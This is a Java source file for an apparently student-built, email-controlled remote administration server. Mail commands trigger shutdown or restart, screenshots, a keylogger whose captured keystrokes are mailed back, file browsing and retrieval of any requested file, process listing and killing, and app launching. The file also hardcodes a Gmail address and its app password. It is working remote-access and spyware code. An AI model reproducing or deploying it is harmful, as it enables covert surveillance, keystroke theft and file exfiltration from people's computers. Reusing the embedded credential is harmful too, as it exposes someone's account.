package com.example.server;

import com.example.server.features.getfile.GetFile;
import com.example.server.features.keylogger.KeyLog;
import com.example.server.features.list.KillPrc;
import com.example.server.features.list.ListApp;
import com.example.server.features.list.ListPrc;
import com.example.server.features.list.RunApp;
import com.example.server.features.power.SRS;
import com.example.server.features.screenshot.Screenshot;
import com.example.server.mail.sendMail;


import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class sendResponse extends Thread{
    final String DEFAULT_MAIL = "projectmangmaytinh2004@gmail.com";
    final String DEFAULT_PASSWORD = "gorabwfzyfuqfkgy";
    int index = 0;
    String key;

    private String getMail(String mail){
        if (!mail.contains(String.valueOf('<'))){
            return mail;
        }
        return mail.substring(mail.indexOf('<')+1,mail.indexOf('>'));
    }

    public sendResponse(String key){
        this.key = key;
    }
    KeyLog kl = new KeyLog();
    @Override
    public void run() {
        if (Server.reqList.isEmpty()){
            return;
        }
        while (index<Server.reqList.size()){
            switch ((Server.reqList.get(index)+" ").substring(0,2)){
                //connect
                case "0 ": {
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.sendContent("Connect Successful");
                    Server.nameReqList.add("Request connect");
                    Server.resList.add("Connect successful");
                    break;
                }
                //shutdown
                case "1 ": {
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.sendContent("Successful");
                    Server.nameReqList.add("Shutdown");
                    Server.resList.add("Successful");
                    SRS.shutdown();
                    break;
                }
                //restart
                case "2 ": {
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.sendContent("Successful");
                    Server.nameReqList.add("Restart");
                    Server.resList.add("Successful");
                    SRS.restart();
                    break;
                }
                //logout
                case "3 ": {
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.sendContent("Successful");
                    Server.nameReqList.add("Log out");
                    Server.resList.add("Successful");
                    SRS.logout();
                    break;
                }
                //sleep
                case "4 ": {
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.sendContent("Successful");
                    Server.nameReqList.add("Sleep");
                    Server.resList.add("Successful");
                    SRS.sleep();
                    break;
                }
                //screenshot
                case "5 ": {
                    Screenshot sc = new Screenshot();
                    File file;
                    file = sc.takeScreenShot();
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.send(file);
                    Server.nameReqList.add("Screenshot");
                    Server.resList.add("Image png");
                    System.out.println(4);
                    break;
                }
                //start keylog
                case "6 ": {
                    kl.start();
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.sendContent("Successful");
                    Server.nameReqList.add("Start keylog");
                    Server.resList.add("keylog on");
                    System.out.println(1);
                    break;
                }
                //end keylog
                case "7 ": {
                    String text = kl.end();
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    FileWriter fw;
                    try {
                        fw = new FileWriter("keylog.txt");
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    try {
                        fw.write(text);
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    try {
                        fw.close();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    File file = new File("keylog.txt");
                    sm.send(file);
                    Server.nameReqList.add("End keylog");
                    Server.resList.add("file keylog.txt");
                    System.out.println(2);
                    break;
                }
                //getfile
                case "8 ": {
                    String text = "Something wrong happened";
                    GetFile gf = new GetFile();

                    if (Server.reqList.get(index).length()<=2){

                        text = gf.listDrive();

                    }
                    else {
                        String path = Server.reqList.get(index).substring(2).strip();
                        File file = new File(path);
                        if (file.isDirectory()){
                            text = gf.listFile(file.getAbsolutePath());
                        }
                        else {
                            if (file.exists()){
                                sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index) + " ok");
                                sm.send(file);
                                Server.nameReqList.add("Get file");
                                Server.resList.add("Sent file");
                                break;
                            }
                            else{
                                text = "File do not exist";
                            }
                        }
                    }
                    File file = new File("filelists.txt");
                    FileWriter fw;
                    try {
                        fw = new FileWriter("filelists.txt");
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    try {
                        fw.write(text);
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    try {
                        fw.close();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.send(file);
                    Server.nameReqList.add("Get list file");
                    Server.resList.add("File filelists.txt");
                    break;
                }
                //list prc
                case "9 ": {
                    ListPrc la = new ListPrc();
                    File file;
                    try {
                        file = la.run();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.send(file);
                    Server.nameReqList.add("List process");
                    Server.resList.add("File listprc.txt");
                    System.out.println(3);
                    break;
                }
                //List app
                case "10": {
                    ListApp la = new ListApp();
                    File appList;
                    try {
                        appList = la.run();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    sm.send(appList);
                    Server.nameReqList.add("List app");
                    Server.resList.add("File listapp.txt");

                    break;
                }
                case "11":{
                    KillPrc kc = new KillPrc();
                    String pid = Server.reqList.get(index).split(" ",-1)[1].strip();
                    kc.run(pid);
                    if (kc.isSuccess()){
                        sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                        sm.sendContent("Successfull");
                        Server.nameReqList.add("Kill Process");
                        Server.resList.add("Successfull");
                    }
                    else {
                        sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                        sm.sendContent("Kill Unsuccessful");
                        Server.nameReqList.add("Kill Process");
                        Server.resList.add("Unsuccessfull");
                    }
                    break;
                }
                case "12":{
                    RunApp ra = new RunApp();
                    String appName = Server.reqList.get(index).split(" ",-1)[1].strip();
                    try {
                        ra.run(appName);
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    Server.nameReqList.add("Run app " + appName);
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                    if (ra.isSuccess()){
                        sm.sendContent("successful");
                        Server.resList.add("Successful");
                    }
                    else {
                        sm.sendContent("unsuccessful");
                        Server.resList.add("Unsuccessful");
                    }
                    break;
                }
                default: {
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 404");
                    sm.sendContent("Wrong Request");
                    Server.nameReqList.add("No determinate");
                    Server.resList.add("Wrong Request");
                    System.out.println(5);
                    break;
                }
            }
            index++;
        }
    }
}
